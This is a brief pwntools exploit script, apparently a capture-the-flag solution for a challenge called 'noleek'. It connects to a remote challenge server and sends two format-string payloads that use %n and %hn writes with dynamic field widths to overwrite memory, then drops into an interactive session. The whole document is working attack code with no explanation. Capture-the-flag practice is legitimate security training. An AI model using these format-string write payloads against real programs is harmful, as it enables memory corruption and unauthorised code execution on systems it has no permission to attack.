from pwn import *

context.log_level = "debug"

# p = process("./noleek")
p = remote("challs.actf.co", 31400)

# gdb.attach(p, gdbscript="b * $_base()+0x1221\nc")
# gdb.attach(p, gdbscript="b * $_base()+0x1262\nc")
p.sendlineafter(b"leek? ", b"%65296p%*13$p%13$hn")
p.sendlineafter(b"leek? ", b"%678166p%*12$p%42$n")

p.interactive()
